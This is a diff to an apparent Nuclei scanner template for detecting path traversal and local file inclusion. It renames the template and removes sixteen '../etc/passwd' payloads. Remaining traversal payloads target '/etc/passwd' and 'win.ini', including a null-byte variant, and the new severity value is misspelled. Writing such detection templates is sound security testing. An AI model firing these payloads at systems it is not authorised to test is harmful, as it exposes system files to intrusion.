@@ -1,12 +1,12 @@
-id: pathtraversal
+id: lfi-keyed
 
 info:
-  name: pathtraversal Detection
+  name: Key LFI Detection
   author: pwnhxl
-  severity: medium
+  severity: unknnown
   reference:
     - https://owasp.org/www-community/attacks/Unicode_Encoding
-  tags: dast,pathtraversal
+  tags: dast,pathtraversal,lfi
 
 variables:
   fuzz: "../../../../../../../../../../../../../../../"
@@ -25,22 +25,6 @@ requests:
 
     payloads:
       pathtraversal:
-        - '/etc/passwd'
-        - 'c:/windows/win.ini'
-        - '../etc/passwd'
-        - '../../etc/passwd'
-        - '../../../etc/passwd'
-        - '../../../../etc/passwd'
-        - '../../../../../etc/passwd'
-        - '../../../../../../etc/passwd'
-        - '../../../../../../../etc/passwd'
-        - '../../../../../../../../etc/passwd'
-        - '../../../../../../../../../etc/passwd'
-        - '../../../../../../../../../../etc/passwd'
-        - '../../../../../../../../../../../etc/passwd'
-        - '../../../../../../../../../../../../etc/passwd'
-        - '../../../../../../../../../../../../../etc/passwd'
-        - '../../../../../../../../../../../../../../etc/passwd'
         - '{{fuzz}}etc/passwd'
         - '{{fuzz}}windows/win.ini'
         - '/etc/passwd%00.jpg'
